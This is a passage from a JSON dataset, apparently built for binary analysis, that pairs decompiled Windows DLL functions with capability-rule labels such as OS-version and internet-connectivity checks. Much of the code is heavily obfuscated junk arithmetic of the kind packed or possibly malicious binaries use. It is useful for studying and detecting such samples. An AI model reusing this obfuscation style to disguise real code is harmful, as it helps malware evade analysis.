        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.100216e0(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    char cVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    int16_t iVar7;\n    uint16_t uVar8;\n    uint32_t uVar9;\n    int16_t *piVar10;\n    ulong uVar11;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    \n    uVar6 = *0x10040980;\n    cVar1 = *0x10040980;\n    *0x1004099a = *0x1004099a + *0x100409b4;\n    cVar3 = (cVar1 - param_1) + -5;\n    uVar9 = (*0x100409b4 * 2 + *0x10040984 * -0x55) - 0x1a43;\n    iVar7 = uVar9;\n    if (*0x100409fc == 0xb61) {\n        cVar3 = (*0x100409d8 + cVar3) * '\\x02' + -0x43;\n    }\n    uVar9 = uVar9 & 0xffff;\n    *0x100409b4 = (uVar9 - *0x100409b4) + *0x10040980;\n    if (*0x100409a0 == 9) {\n        *0x100409b0 = (uVar9 - *0x100409b4) - 5;\n    }\n    else {\n        iVar7 = iVar7 + *0x100409b0 + -0x1a43;\n    }\n    uVar9 = *0x100409b0;\n    *0x1004262c = 0x10042630;\n    uVar8 = iVar7 + (*0x10040988 - param_1) + 5;\n    *0x10040984 = uVar8;\n    *0x10040984 = CONCAT12(cVar3 + *0x10040984 + -0x43, uVar8);\n    *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n    iVar2 = fcn.10022a10();\n    if (*0x100409a0 == 9) {\n        *0x100409b0 = (uVar8 - *0x100409b4) - 5;\n    }\n    else {\n        uVar8 = uVar8 + uVar9 + -0x1a43;\n    }\n    iVar7 = uVar8 + (-5 - *0x100409b4);\n    *0x10040984 = iVar7;\n    *0x10040984 = CONCAT12((cVar1 - *0x10040984) + -5, iVar7);\n    *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n    if (*0x100409b4 <= uVar6) {\n        *0x1004099a = *0x1004099a + iVar2;\n        uVar6 = iVar2 + *0x100409b4 * -0x55;\n        *0x100409b4 = *0x100409b4 + 0xe5bd + iVar2;\n        *0x10040980 = uVar6;\n    }\n    *0x10040988 = fcn.10022760();\n    *0x10040984 = CONCAT12((uVar6 - *0x10040984) + -5, *0x10040984);\n    *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n    if (*0x10040994 + (*0x100409b0 & 0xffff) == 0x130) {\n        *0x100409b4 = *0x100409b4 * 2 + 0xe5bd;\n        *0x10040980 = (*0x100409b4 - *0x10040988) + 5 + uVar6;\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + (*0x100409b4 - *0x10040988) + 5;\n        *0x100409b4 = *0x100409b4 * 2 + 0xe5bd;\n    }\n    fcn.10001c70();\n    uVar5 = (*0x10040984 - *0x10040986) + *0x10040980;\n    uStack36 = *0x10040980;\n    *0x10040984 = CONCAT12(uVar5, *0x10040984);\n    if (*0x100409a0 == 9) {\n        *0x100409b0 = ((*0x10040984 & 0xffff) - *0x100409b4) - 5;\n    }\n    uStack32 = 0x2104521;\n    uVar9 = 0x2b - *0x100409b4;\n    uVar6 = uVar9 & 0xffff;\n    if (*0x100409b4 <= *0x10040980) {\n        *0x1004099a = *0x1004099a + *0x10040988;\n        uStack36 = *0x10040988 + *0x100409b4 * -0x55;\n        *0x100409b4 = *0x100409b4 + 0xe5bd + *0x10040988;\n    }\n    if (*0x100409a0 == 9) {\n        *0x100409b0 = ((uVar9 & 0xffff) - *0x100409b4) - 5;\n    }\n    else {\n        uVar6 = uVar9 + *0x100409b0 + -0x1a43;\n    }\n    *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984 & 0xffff0000 | uVar6;\n    uStack56 = fcn.10022760();\n    uVar9 = ((uVar5 - (uVar9 & 0xffff)) + uStack36) - *0x100409b4;\n    uStack52 = (uVar9 & 0xffff) + (*0x10040984 >> 0x10 & 0xff) * -0x55;\n    uStack28 = 0xb;\n    iVar2 = (*0x100409b0 & 0xffff) + *0x10040994;\n    *0x10040984 = uVar9 & 0xffff;\n    *0x10040986 = (uStack52 - (*0x10040984 >> 0x10)) + *0x10040984;\n    uStack24 = 0x93;\n    *0x10040984 = uVar9 & 0xffff;\n    uVar6 = *0x10040984 & 0xff000000;\n    *0x10040984 = uVar6 | *0x10040984;\n    if (iVar2 == 0x130) {\n        iVar4 = *0x100409b4 * 2 + 0xe5bd;\n        *0x10040984 = uVar6 | *0x10040984 & 0xffff0000 | uVar9 + (iVar4 - uStack52) + 5;\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + (*0x100409b4 - uStack52) + 5;\n        iVar4 = *0x100409b4 * 2 + 0xe5bd;\n    }\n    uStack48 = 0xbf;\n    iStack44 = 0;\n    if (*0x100409a0 == 9) {\n        uStack52 = (((*0x10040984 + iVar4 * 2) - 0x7862 & 0xffff) - iVar4) - 5;\n        uStack56 = (*0x10040986 - iVar4) - 5;\n    }\n    else {\n        *0x10040986 = *0x10040986 + uStack56 + -0x43;\n        *0x10040984 = CONCAT11(*0x10040987, *0x10040986) << 0x10;\n    }\n    if (iVar2 != 0x130) {\n        *0x100409a4 = *0x100409a4 + (iVar4 - uStack52) + 5;\n    }\n    uStack36 = iVar4 * 2 + 0xe5bd;\n    iVar7 = uStack36;\n    if (*0x100409ae == 0xb61) {\n        uStack36 = ((*0x1004099c & 0xffff) + uStack36) * 2 + 0xe5bd;\n    }\n    uVar6 = (uStack36 + 0x69) - iVar7;\n    if (*0x100409a0 == 9) {\n        uStack56 = (*0x10040986 - uStack36) - 5;\n    }\n    else {\n        *0x10040986 = *0x10040986 + uStack56 + -0x43;\n        *0x10040984 = CONCAT11(*0x10040987, *0x10040986) << 0x10;\n    }\n    while( true ) {\n        *0x10040980 = (uVar6 & 0xffff) + *0x10040986 * -0x55;\n        iVar2 = (uStack52 & 0xffff) + *0x10040994;\n        if (iVar2 == 0x130) {\n            *0x100409b4 = uStack36 * 2 + 0xe5bd;\n            *0x10040986 = *0x10040986 + (*0x100409b4 - uStack56) + '\\x05';\n            *0x10040984 = CONCAT11(*0x10040987, *0x10040986) << 0x10;\n        }\n        else {\n            *0x100409b4 = uStack36 * 2 + 0xe5bd;\n            *0x100409a4 = *0x100409a4 + (uStack36 - uStack56) + 5;\n        }\n        iVar7 = *0x100409b4;\n        uVar8 = uVar6 + iVar7 + -0x1a43;\n        if ((*0x100409b4 & 0xffff) <= *0x100409b4) {\n            *0x10040980 = ((*0x10040980 * 2 + *0x100409b4 * -3) - uVar8) - 23999;\n            *0x100409a4 = uVar8;\n        }\n        if (uStack56 < uVar8) {\n            uVar8 = uVar8 + iVar7 + -0x5e1f;\n            if (uStack56 == 0) {\n                if (iVar2 != 0x130) {\n                    *0x100409a4 = *0x100409a4 + (uStack52 - iVar7) + 5;\n                }\n                uStack52 = uStack52 * 2 + 0xe5bd;\n            }\n            *0x10040980 = uStack52 + uStack56 * -0x55;\n        }\n        uVar8 = uVar8 + iVar7 + 0x3e;\n        uVar6 = uVar8;\n        if (*0x10040980 < uVar6) {\n            uVar8 = 0x2b - *0x100409b4;\n            *0x10040980 = (*0x10040986 * 2 - (0x2b - *0x100409b4 & 0xffff)) + uVar6 + 6;\n        }\n        else if (*0x100409b4 <= *0x10040980) {\n            *0x10040980 = uStack56 + *0x100409b4 * -0x55;\n            *0x1004099a = *0x1004099a + uStack56;\n            *0x100409b4 = *0x100409b4 + 0xe5bd + uStack56;\n        }\n        if (uStack32 == 0) break;\n        uVar8 = uVar8 + *0x100409b4 + 0xa1e1;\n        uVar6 = *0x10040984 & 0xffff0000;\n        *0x10040984 = uVar6 | uVar8;\n        *0x10040988 = uStack56;\n        *0x100409b0 = uStack52;\n        if (uStack32 < 0xd2) {\n            if (uVar8 <= *0x10040980) {\n                *0x1004099a = *0x1004099a + *0x100409b4;\n                *0x10040980 = *0x100409b4 + uVar8 * -0x55;\n                *0x10040984 = uVar6 | uVar8 + *0x100409b4 + 0xe5bd;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x13);\n            *0x10040984 = *0x10040984 + *0x100409b4 + -0x1a43;\n            uVar6 = *0x10040984 & 0xffff0000;\n            *0x10040984 = uVar6 | *0x10040984;\n            *0x10040986 = uVar6 >> 0x10;\n            *0x10040988 = *0x10040988 + 0xe5bd + *0x10040980;\n        }\n        *0x10040984 = CONCAT12((*0x10040984 - *0x10040986) + *0x10040980, *0x10040984);\n        *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n        fcn.10001ab0();\n        if (*0x100409a0 != 9) {\n            *0x10040980 = (*0x10040984 & 0xffff) + 0xe5bd + *0x10040980;\n        }\n        uStack36 = *0x100409b4;\n        uVar6 = 0x2b - *0x100409b4;\n        uStack32 = uStack32 - 1;\n        uStack52 = *0x100409b0;\n        iVar2 = (((*0x10040988 - (uVar6 & 0xffff)) - *0x10040986) - *0x100409b0) + 0x30 + *0x10040980;\n        uStack56 = (iVar2 - *0x100409b4) - 5;\n        if (*0x100409a0 == 9) {\n            uVar6 = (iVar2 - *0x10040986) - 5;\n        }\n    }\n    if (*0x100409b4 <= uVar8) {\n        *0x100409a4 = *0x10040986;\n        *0x10040980 = ((*0x10040980 * 2 + uVar8 * -3) - *0x10040986) - 23999;\n    }\n    *0x10040980 = *0x10040980 + ((0x2b - *0x10040986) - uVar8);\n    if ((uVar8 < *0x10040980) && (*0x10040980 = (*0x100409b4 & 0xffff) + *0x10040986 * -0x55,  *0x100409ae == 0xb61)) {\n        uStack52 = ((*0x1004099c & 0xffff) + uStack52) * 2 + 0xe5bd;\n    }\n    uStack32 = 0x2104521;\n    piVar10 = 0x100409c0;\n    uVar6 = 0x2b - *0x100409b4;\n    iVar2 = *0x10040980 + ((0x2b - uStack56) - *0x100409b4);\n    *0x10040984 = *0x10040984 & 0xffff0000 | uVar6 & 0xffff;\n    iVar4 = iVar2 - (uVar6 & 0xffff);\n    *0x100409b4 = iVar4 - 5;\n    while (*0x10040986 != *0x100409e8) {\n        uVar8 = uVar6 + *piVar10;\n        uVar6 = uVar8;\n        *0x10040984 = uVar8;\n        *0x10040986 = uStack52 + '>' + *0x10040984;\n        *0x10040984 = CONCAT12(*0x10040986, uVar8);\n        *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n        if ((uVar8 == *0x100409d4) || (piVar10 = piVar10 + 4,  0x10040a33 < piVar10)) break;\n    }\n    uVar9 = *0x10040986;\n    iVar2 = ((uVar6 & 0xffff) - 0x5e1f) + (iVar2 * 2 - uVar9);\n    if (*0x100409a0 == 9) {\n        iVar2 = (*0x100409b4 - uStack56) + -5;\n    }\n    else {\n        *0x100409b4 = iVar4 + 0xe5b8 + iVar2;\n    }\n    if (*0x100409e0 == 9) {\n        iVar2 = ((uVar6 & 0xffff) - uVar9) + -5;\n    }\n    else {\n        uVar8 = uVar6 + iVar2 + -0x1a43;\n        uVar6 = uVar8;\n        *0x10040984 = *0x10040984 & 0xffff0000 | uVar8;\n    }\n    *0x10040980 = iVar2 + 0x100204cc;\n    *0x100409b0 = uStack52 + (uVar9 - (uVar6 & 0xffff)) + 5;\n    if (*0x100409e0 == 9) {\n        uVar8 = (*0x10040980 - *0x10040986) - 5;\n        uVar6 = uVar8;\n        *0x10040984 = *0x10040984 & 0xffff0000 | uVar8;\n    }\n    else {\n        *0x10040980 = *0x10040980 + (uVar6 & 0xffff) + 0xe5bd;\n    }\n    while( true ) {\n        iStack44 = iStack44 + 1;\n        *0x10040980 = *0x10040980 + ((0x2b - uStack56) - *0x100409b4);\n        if (*0x100409ae == 0xb61) {\n            *0x10040986 = (*0x1004099c + *0x10040986) * '\\x02' + 0xbd;\n            *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n        }\n        *0x10040984 = uVar6;\n        if (0x17df7 < *0x10040980) {\n            *0x10040980 = *0x100409b4 + uStack56 * -0x55;\n            if (*0x100409a0 == 9) {\n                *0x10040984 = (*0x10040980 - *0x10040986) - 5;\n                *0x10040984 = *0x10040984 & 0xffff0000 | *0x10040984;\n            }\n            else {\n                *0x10040980 = *0x10040980 + 0xe5bd + (uVar6 & 0xffff);\n            }\n        }\n        if (iStack44 < 0x49) {\n            *0x10040988 = uStack56 + 0xe5bd + *0x100409b4;\n            iVar7 = iStack44;\n            if (*0x10040994 + (*0x100409b0 & 0xffff) == 0x130) {\n                uVar5 = *0x10040986 * '\\x02' + 0xbd;\n                *0x10040984 = *0x10040984 & 0xffff0000 | *0x10040984 + (uVar5 - iVar7) + 5;\n            }\n            else {\n                *0x100409a4 = *0x100409a4 + (*0x10040986 - iVar7) + 5;\n                uVar5 = *0x10040986 * '\\x02' + 0xbd;\n            }\n            *0x10040984 = CONCAT12(uVar5, *0x10040984);\n            *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n            *0x10040980 = *0x10040988 + 1 + *0x100409b4;\n            (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableW)(L\"Discuss\", 0x10041b50, 0x637);\n            uStack56 = *0x10040988 + 0xe5bd + *0x100409b4;\n            if (*0x10040986 <= *0x10040984) {\n                *0x1004099a = *0x1004099a + iVar7;\n                *0x10040984 = iVar7 + *0x10040986 * -0x55;\n                *0x10040986 = *0x10040986 + iStack44 + -0x43;\n                *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n            }\n        }\n        iVar2 = (*0x100409b0 & 0xffff) + *0x10040994;\n        uVar8 = *0x100409b4;\n        if (iVar2 == 0x130) {\n            *0x100409b0 = *0x100409b0 * 2 + 0xe5bd;\n            *0x10040980 = *0x10040980 + 5 + (*0x100409b0 - *0x100409b4);\n        }\n        else {\n            *0x100409a4 = *0x100409a4 + (*0x100409b0 - uVar8) + 5;\n            *0x100409b0 = *0x100409b0 * 2 + 0xe5bd;\n        }\n        uVar6 = *0x10040980;\n        if (uVar8 <= *0x10040984) {\n            *0x100409a4 = *0x10040986;\n            *0x10040980 = ((*0x10040980 * 2 + *0x10040984 * -3) - *0x10040986) - 23999;\n        }\n        if (uStack24 < 3) {\n            *0x10040980 = *0x100409b4 * -0x54 + uStack56 * 0x55 + uVar6 * -0x55;\n            uStack24 = uStack24 - 1;\n        }\n        iVar4 = *0x10040980 - *0x100409b4;\n        if (*0x100409ae == 0xb61) {\n            *0x10040986 = (*0x1004099c + *0x10040986) * '\\x02' + 0xbd;\n            *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n        }\n        uVar6 = *0x10040984;\n        if (iVar2 == 0x130) {\n            uVar9 = *0x10040984 * 2 - 0x1a43;\n            *0x10040980 = *0x10040980 + 5 + ((uVar9 & 0xffff) - *0x100409b4);\n        }\n        else {\n            *0x100409a4 = *0x100409a4 + (*0x10040984 - uVar8) + 5;\n            uVar9 = *0x10040984 * 2 - 0x1a43;\n        }\n        *0x10040988 = (*0x100409b0 - (iVar4 + -5)) + uStack48;\n        *0x10040984 = *0x10040984 & 0xffff0000 | uVar9 & 0xffff;\n        if (0xb341 < *0x10040988) {\n            *0x10040980 = *0x10040988 + 1 + *0x100409b4;\n            if (*0x100409b0 == (uVar9 & 0xffff)) {\n                uStack36._0_1_ = -0x51;\n                uVar5 = *0x100409b4 * -0x55 + 0xaf;\n                if ((*0x100409b4 & 0xffff) <= *0x10040988) {\n                    *0x100409a4 = uVar5;\n                    uStack36._0_1_ = (*0x10040988 * -3 + -0x61) - uVar5;\n                }\n                *0x100409b4 = *0x10040980 + 0x3e;\n                if (*0x100409ae == 0xb61) {\n                    *0x100409b4 = ((*0x1004099c & 0xffff) + *0x100409b4) * 2 + 0xe5bd;\n                }\n                *0x10040986 = *0x100409b4 + '\\x01' + uStack36;\n                *0x10040984 = uVar9 & 0xffff;\n                *0x10040984 = uVar6 & 0xff000000 | *0x10040984;\n                if (*0x100409b4 <= *0x10040986) {\n                    *0x100409b4 = ((*0x100409b4 * 2 + *0x10040986 * -3) - (uVar9 & 0xffff)) - 23999;\n                    *0x100409a4 = uVar9;\n                }\n            }\n            if (iVar2 == 0x130) {\n                uVar9 = *0x10040984 * 2 - 0x1a43;\n                *0x10040984 = *0x10040984 & 0xffff0000 | uVar9 & 0xffff;\n                *0x10040980 = *0x10040980 + 5 + ((uVar9 & 0xffff) - *0x100409b4);\n            }\n            else {\n                *0x100409a4 = *0x100409a4 + (*0x10040984 - *0x100409b4) + 5;\n                uVar9 = *0x10040984 * 2 - 0x1a43 & 0xffff;\n                *0x10040984 = *0x10040984 & 0xffff0000 | uVar9;\n            }\n        }\n        if (*0x100409ae == 0xb61) {\n            *0x100409b4 = ((*0x1004099c & 0xffff) + *0x100409b4) * 2 + 0xe5bd;\n        }\n        if (uStack48 < 9) {\n            if (*0x100409a0 == 9) {\n                *0x100409b4 = (*0x10040980 - *0x10040988) - 5;\n            }\n            else {\n                *0x10040980 = *0x10040980 + 0xe5bd + *0x100409b4;\n            }\n            if (*0x100409ae == 0xb61) {\n                *0x100409b4 = ((*0x1004099c & 0xffff) + *0x100409b4) * 2 + 0xe5bd;\n            }\n            uStack48 = uStack48 - 1;\n            if ((*0x100409b4 & 0xffff) <= uStack48) {\n                *0x100409b0 = ((*0x100409b0 * 2 + uStack48 * -3) - *0x10040988) - 23999;\n                *0x100409a4 = *0x10040988;\n            }\n        }\n        if (*0x100409b4 <= *0x10040980) {\n            *0x1004099a = *0x1004099a + *0x10040988;\n            *0x10040980 = *0x10040988 + *0x100409b4 * -0x55;\n            *0x100409b4 = *0x100409b4 + 0xe5bd + *0x10040988;\n        }\n        uVar6 = *0x100409b4;\n        if (*0x100409a0 == 9) {\n            *0x10040986 = (*0x10040984 - *0x10040988) - 5;\n            *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n        }\n        else {\n            uVar8 = uVar9 + *0x10040986 + 0xe5bd;\n            uVar9 = uVar8;\n            *0x10040984 = *0x10040984 & 0xffff0000 | uVar8;\n        }\n        if ((uVar9 & 0xffff) <= *0x10040980) {\n            *0x1004099a = *0x1004099a + *0x100409b4;\n            *0x10040980 = *0x100409b4 + (uVar9 & 0xffff) * -0x55;\n            uVar8 = uVar9 + *0x100409b4 + 0xe5bd;\n            uVar9 = uVar8;\n            *0x10040984 = *0x10040984 & 0xffff0000 | uVar8;\n        }\n        if (uStack32 == 0) break;\n        *0x100409b0 = uStack32 + 0x3e + *0x100409b4;\n        fcn.10001ab0();\n        if (*0x100409ae == 0xb61) {\n            *0x100409b4 = ((*0x1004099c & 0xffff) + *0x100409b4) * 2 + 0xe5bd;\n        }\n        uStack32 = uStack32 + -1;\n        *0x10040984 = *0x10040984 + *0x100409b4 + 0x3e;\n        uVar6 = *0x10040984;\n        uVar9 = *0x10040984 & 0xffff0000;\n        *0x10040984 = uVar9 | *0x10040984;\n        if (uStack28 < 4) {\n            if (*0x100409ae == 0xb61) {\n                *0x10040988 = ((*0x1004099c & 0xffff) + *0x10040988) * 2 + 0xe5bd;\n            }\n            uStack28 = uStack28 - 1;\n            if (*0x100409ae == 0xb61) {\n                uVar6 = (*0x1004099c + *0x10040984) * 2 - 0x1a43;\n                *0x10040984 = uVar9 | uVar6 & 0xffff;\n            }\n            *0x100409b0 = *0x100409b0 + ((0x2b - *0x10040988) - uStack28);\n            uStack56 = *0x10040988;\n        }\n        else {\n            if (*0x100409a0 == 9) {\n                uStack48 = (*0x10040980 - *0x10040986) - 5;\n            }\n            else {\n                *0x10040980 = uStack48 + *0x10040980 + 0xe5bd;\n            }\n            uStack56 = *0x10040988;\n        }\n        *0x100409b4 = *0x100409b4 + (0x24 - (uVar6 & 0xffff));\n    }\n    *0x10040988 = param_1 + (uVar9 & 0xffff) * -0x55;\n    if (*0x100409b4 <= uVar9) {\n        *0x100409a4 = *0x10040986;\n        *0x100409b4 = ((*0x100409b4 * 2 + (uVar9 & 0xffff) * -3) - *0x10040986) - 23999;\n    }\n    uVar11 = CONCAT44(*0x100409b4, *0x100409b4);\n    if ((uVar6 & 0xffff) <= *0x10040988) {\n        *0x100409a4 = *0x100409b4;\n        *0x10040986 = ((*0x10040986 * '\\x02' + *0x10040988 * -3) - *0x100409b4) + 0x41;\n        *0x10040984 = CONCAT11(*0x10040987, *0x10040986) << 0x10;\n    }\n    iVar2 = 0x2b - *0x100409b4;\n    *0x10040984 = *0x10040984 & 0xffff0000 | (*0x10040988 - iVar2) - 5;\n    *0x10040980 = iVar2;\n    if (*0x10040988 < (uVar6 & 0xffff)) goto code_r0x10022643;\n    iVar4 = *0x10040988 * 3;\n    do {\n        *0x100409b4 = uVar11;\n        *0x100409a4 = uVar11 >> 0x20;\n        *0x10040984 = *0x10040984 & 0xffff0000 | ((*0x10040984 * 2 - iVar4) - *0x100409a4) + 0xa241;\ncode_r0x10022643:\n        if (*0x100409fc == 0xb61) {\n            *0x10040984 = CONCAT12((*0x100409d8 + *0x10040986) * '\\x02' + -0x43, *0x10040984);\n            *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n        }\n        uVar11 = fcn.10029c20(iVar2, *0x1004262c);\n        uVar6 = *0x10040988;\n        cVar3 = *0x100409b0 + 0x3eU + *0x10040984;\n        *0x10040984 = CONCAT12(cVar3, *0x10040984);\n        *0x10040984 = *0x10040984 & 0xff000000 | *0x10040984;\n        iVar4 = extraout_ECX;\n    } while (!CARRY1(*0x100409b0 + 0x3eU, *0x10040984) && cVar3 != '\\0');\n    piVar10 = 0x100409ec;\n    do {\n        if (uVar11 == *0x100409a4) break;\n        *piVar10 = *piVar10 - uVar6;\n        piVar10 = piVar10 + -1;\n    } while (0x10040992 < piVar10);\n    if (*0x10040994 + (*0x100409b0 & 0xffff) != 0x130) {\n        *0x100409a4 = *0x100409a4 + (uVar11 - uVar6) + 5;\n    }\n    *0x100409b4 = uVar11 * 2 + 0xe5bd;\n    uVar9 = (uVar6 - *0x10040980) - 5;\n    *0x10040984 = uVar9 & 0xffff | *0x10040986 << 0x10;\n    piVar10 = 0x10040990;\n    while (*0x100409b4 != *0x100409a4) {\n        uVar8 = uVar9 + *piVar10;\n        uVar9 = uVar8;\n        *0x100409b4 = uVar6 + 0x3e + uVar9;\n        *0x10040984 = *0x10040984 & 0xffff0000 | uVar8;\n        if ((uVar8 == *0x1004099a) || (piVar10 = piVar10 + 2,  0x100409c9 < piVar10)) break;\n    }\n    return *0x10040984 >> 0x10 & 0xff;\n}\n",
        "token_count": 8506
    },
    "100030a0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.100030a0(uint *param_1, int32_t param_2, uint32_t param_3, ushort param_4)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    \n    if (param_3 == 1) {\n        if (7 < param_1[5]) {\n            param_1 = *param_1;\n        }\n        *(param_1 + param_2 * 2) = param_4;\n        return;\n    }\n    if (7 < param_1[5]) {\n        param_1 = *param_1;\n    }\n    if (param_3 != 0) {\n        puVar2 = param_1 + param_2 * 2;\n        for (uVar1 = param_3 >> 1; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar2 = CONCAT22(param_4, param_4);\n            puVar2 = puVar2 + 1;\n        }\n        for (uVar1 = (param_3 & 1) != 0; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar2 = param_4;\n            puVar2 = puVar2 + 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "10004510": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10004510(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *puVar1;\n    uchar auStack36 [8];\n    uint32_t uStack28;\n    uint32_t uStack12;\n    \n    uStack12 = *0x10040068 ^ &stack0xffffffdc;\n    puVar1 = &fcn.10004510::arg_8h;\n    arg_8h_00 = 0x10004539;\n    fcn.10004a90(&stack0xffffffdc, puVar1, &fcn.10004510::arg_8h + 2);\n    if (7 < uStack28) {\n        arg_8h_00 = uStack28 + 1;\n        fcn.100026c0(puVar1);\n    }\n    fcn.1000ac84(arg_8h_00);\n    return;\n}\n",
        "token_count": 202
    },
    "10006a70": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.10006a70(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(*(param_1 + 4) + 4);\n    if ((((uVar1 != 0x14) && (uVar1 != 8)) && (uVar1 != 0xd)) &&\n       ((uVar1 != 2 || (((uVar1 = *(*(*(param_1 + 4) + 0x10) + 4),  uVar1 != 0x14 && (uVar1 != 8)) && (uVar1 != 0xd)))))\n       ) {\n        return uVar1 & 0xffffff00;\n    }\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 172
    },
    "10007050": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.10007050(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    uint uStack84;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint32_t uStack12;\n    \n    uStack12 = *0x10040068 ^ &uStack72;\n    uStack68 = arg_8h & 0xffff;\n    uStack84 = &uStack68 + 2;\n    fcn.10004a90(&uStack60, &uStack68);\n    if (7 < uStack52) {\n        fcn.100026c0(uStack72, uStack52 + 1);\n    }\n    uStack84 = arg_ch & 0xffff;\n    uStack60 = 7;\n    arg_8h_00 = &iStack56;\n    uStack64 = 0;\n    fcn.10004a90(arg_8h_00, &uStack84, &uStack84 + 2);\n    if (7 < uStack48) {\n        fcn.100026c0(uStack68, uStack48 + 1);\n    }\n    fcn.1000ac84(arg_8h_00);\n    return;\n}\n",
        "token_count": 312
    },
    "10021060": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.10021060(void)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    \n    iVar3 = (*0x100409b0 & 0xffff) + *0x10040994;\n    iVar8 = 0x26;\n    if (iVar3 == 0x130) {\n        uVar5 = *0x10040984 * 2 - 0x1a43;\n        uVar6 = uVar5;\n        *0x100409b0 = (uVar5 & 0xffff) + (*0x100409b0 - 0xef);\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + *0x10040984 + -0xef;\n        uVar6 = *0x10040984 * 2 + 0xe5bd;\n    }\n    if (iVar3 == 0x130) {\n        *0x100409b4 = uVar6 * 2 + 0xe695;\n        uVar6 = uVar6 + (*0x100409b4 - *0x100409b0) + 5;\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + (uVar6 - *0x100409b0) + 0x71;\n        *0x100409b4 = uVar6 * 2 + 0xe695;\n    }\n    *0x10040984 = *0x10040984 & 0xffff0000 | uVar6;\n    *0x10040980 = fcn.10021670();\n    *0x10040980 = *0x10040980 + (-0xc9 - *0x100409b4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x637, 0x10053918);\n    uVar5 = *0x100409b4;\n    *0x10042628 = 0x2e;\n    *0x10040984 = *0x10040984 & 0xffff0000 | uVar4 & 0xffff;\n    do {\n        if (uVar5 == *0x100409a4) break;\n        piVar1 = *0x10042628 * 2 + 0x10040990;\n        *piVar1 = *piVar1 - uVar4;\n        *0x10042628 = *0x10042628 + -1;\n        iVar8 = uVar5 * -0x56 + 0x2b;\n        uVar4 = *0x10040984 & 0xffff;\n    } while (1 < *0x10042628);\n    (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 9, 9);\n    uVar5 = *0x10040984 & 0xffff;\n    *0x10042628 = 0x2e;\n    if (str.._AV_Locimp_locale_std__._0_4_ <= uVar5) {\n        *0x100409e8 = *0x100409b4;\n    }\n    do {\n        if (uVar5 == *0x100409e8) break;\n        piVar2 = *0x10042628 * 4 + 0x100409c0;\n        *piVar2 = *piVar2 - iVar8;\n        *0x10042628 = *0x10042628 + -1;\n    } while (1 < *0x10042628);\n    uVar4 = fcn.100213a0();\n    uVar5 = *0x100409b4;\n    uVar7 = *0x10040984 & 0xffff;\n    *0x10042628 = 0x2e;\n    *0x10040980 = (*0x100409b4 - uVar7) + -5;\n    *0x100409b0 = uVar4;\n    do {\n        if (uVar5 == *0x100409a4) break;\n        piVar1 = *0x10042628 * 2 + 0x10040990;\n        *piVar1 = *piVar1 - uVar4;\n        *0x10042628 = *0x10042628 + -1;\n        uVar7 = uVar5 * -0x56 + 0x2b;\n        *0x10040984 = *0x10040984 & 0xffff0000 | uVar7 & 0xffff;\n    } while (1 < *0x10042628);\n    if (*0x100409c8 + *0x10040a00 == 0x130) {\n        uVar5 = 